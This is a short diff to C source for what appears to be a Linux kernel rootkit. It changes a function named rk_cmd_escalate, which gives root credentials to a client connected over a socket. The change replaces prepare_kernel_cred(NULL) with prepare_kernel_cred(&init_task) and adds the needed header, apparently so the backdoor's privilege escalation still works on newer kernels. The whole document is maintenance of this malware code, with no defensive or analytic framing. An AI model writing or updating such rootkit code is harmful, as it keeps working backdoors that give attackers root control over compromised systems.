@@ -16,6 +16,7 @@
 //
 #include <crypto/hash.h>
 #include <linux/cred.h>
+#include <linux/sched/task.h>
 #include <linux/fs.h>
 #include <linux/init.h>
 #include <linux/in.h>
@@ -488,7 +489,7 @@ static int rk_cmd_escalate(struct socket *client)
 {
 	struct cred *new;
 
-	new = prepare_kernel_cred(NULL);
+	new = prepare_kernel_cred(&init_task);
 	if (!new)
 		return rk_send(client, "escalate failed\n", 16);
 	commit_creds(new);
